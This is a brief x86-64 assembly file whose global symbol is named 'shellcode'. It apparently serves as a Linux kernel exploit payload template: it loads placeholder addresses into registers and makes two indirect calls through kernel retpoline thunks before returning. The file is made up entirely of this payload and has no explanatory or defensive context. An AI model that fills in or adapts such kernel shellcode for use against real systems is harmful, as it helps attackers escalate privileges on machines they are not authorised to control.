.global shellcode
.text

shellcode:
    push %rdi
    mov $0x6969696969696969, %rdi
    mov $0x6969696969696969, %rax    
    call __x86_indirect_thunk_rax
    mov $0x6969696969696969, %rdi
    call __x86_indirect_thunk_rax 
    
    pop %rdi

    jmp __x86_return_thunk         

